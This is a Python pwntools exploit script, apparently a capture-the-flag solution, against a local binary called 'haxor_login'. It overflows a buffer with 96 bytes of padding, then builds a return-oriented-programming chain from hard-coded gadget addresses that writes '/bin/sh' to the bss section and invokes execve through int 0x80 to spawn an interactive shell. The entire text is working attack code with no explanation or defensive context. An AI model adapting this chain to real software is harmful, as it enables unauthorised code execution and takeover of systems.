from pwn import *
from struct import pack
r = process("./haxor_login")
p = "A" * 96

p += pack('I',0x080b93c6) # pop eax; ret
p += '/bin' # /bin/sh string
p += pack('I',0x0806fd7a) # pop edx; ret
p += pack('I',0x80ebf80) # bss+0
p += pack('I',0x0805577b) # mov dword ptr [edx], eax; ret; 
p += pack('I',0x080b93c6) # pop eax; ret
p += '/sh\x00' # /bin/sh string
p += pack('I',0x0806fd7a) # pop edx; ret
p += pack('I',0x80ebf84) # bss+4
p += pack('I',0x0805577b) # mov dword ptr [edx], eax; ret; 
p += pack('I',0x080b93c6) # pop eax; ret
p += pack('I',11) # execve()
p += pack('I',0x0806fd7a) # pop edx; ret
p += pack('I',0) # 0
p += pack('I',0x0806fda1) # pop ecx; ebx; ret
p += pack('I',0) # 0
p += pack('I',0x80ebf80) # bss
p += pack('I',0x08070340) # int 0x80; ret;



r.sendlineafter(":","")
r.sendlineafter(":",p)

r.interactive()